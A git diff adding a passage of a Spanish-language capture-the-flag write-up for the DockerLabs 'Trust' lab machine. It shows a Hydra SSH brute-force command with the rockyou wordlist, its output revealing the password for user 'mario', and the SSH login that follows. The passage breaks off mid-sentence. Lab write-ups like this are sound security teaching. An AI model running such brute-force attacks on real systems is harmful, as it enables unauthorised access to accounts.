@@ -128,10 +128,44 @@ Finished
 * Con -x seleccionamos la extensión de archivos que queremos buscar.
 
 Podemos observar que, tras el escaneo que duró unos pocos segundos, se nos ha devuelto un status code 200 en el archivo *secret.php*. Con esto, nos dirigiremos al navegador para comprobar que es.
-![Mensaje]()
-Nos encontramos frente a una página en blanco con un mensaje con un nombre en el centro.  Además, inspeccionando el código fuente de la página no parece haber nada sospechoso, por lo que solo podemos interpretar que este nombre pueda ser un usuario válido de sistema y probarlo en el servicio SSH utilizando fuerza bruta con la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra).
+![Mensaje](https://github.com/JavieRR13/WriteUps/blob/8f7742950694bd6cce9ba76009eb43a6e12d5b34/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_Mensaje.png)
+Nos encontramos frente a una página en blanco con un mensaje con un nombre en el centro.  Además, inspeccionando el código fuente de la página no parece haber nada sospechoso, por lo que solo podemos interpretar que este nombre pueda ser un usuario válido de sistema y probarlo en el servicio SSH utilizando fuerza bruta con la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) y el diccionario de [rockyou](https://github.com/topics/rockyou-wordlist).
+```ruby
+❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 10:56:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.18.0.2:22/
+[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 10:56:28
+```
+* Con -l seleccionamos el usuario.
+* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
+* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
+Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *mario*.
+Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
+```ruby
+❯ ssh mario@172.18.0.2
+mario@172.18.0.2's password: 
+Linux 99ebdb36daec 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64
 
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
+mario@99ebdb36daec:~$ whoami
+mario
+```
+Una vez dentro de la máquina víctima, vamos a listar 
 
 
 
